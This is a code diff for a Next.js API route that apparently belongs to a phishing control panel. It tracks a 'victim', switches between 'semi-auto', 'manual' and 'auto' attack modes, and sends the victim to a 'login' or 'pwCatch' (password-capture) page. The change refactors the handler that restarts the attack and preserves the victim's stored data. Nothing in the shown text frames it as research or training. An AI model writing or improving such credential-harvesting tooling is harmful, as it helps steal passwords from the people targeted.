@@ -216,19 +216,20 @@ export async function POST(request: NextRequest) {
             return NextResponse.json({ error: 'No victim to restart.' }, { status: 400 });
         }
         
+        let nextPage: AppState['victim']['currentPage'] = 'login';
+        if (appState.config.attackMode === 'semi-auto') {
+            nextPage = 'pwCatch';
+        } else if (appState.config.attackMode === 'manual') {
+            nextPage = 'login';
+        }
+        
         const resetData: Partial<AppState['victim']> = {
+            ...appState.victim, // Preserve existing data
             attempts: 0,
             errorMessage: '',
             isTyping: false,
+            currentPage: nextPage,
         };
-
-        if (appState.config.attackMode === 'semi-auto') {
-            resetData.currentPage = 'pwCatch';
-        } else if (appState.config.attackMode === 'manual') {
-            resetData.currentPage = 'login';
-        } else { // auto
-            resetData.currentPage = 'login';
-        }
         
         await update(victimRef, resetData);
         return NextResponse.json({ success: true, message: 'Attack restarted' });
@@ -261,5 +262,3 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
   }
 }
-
-    
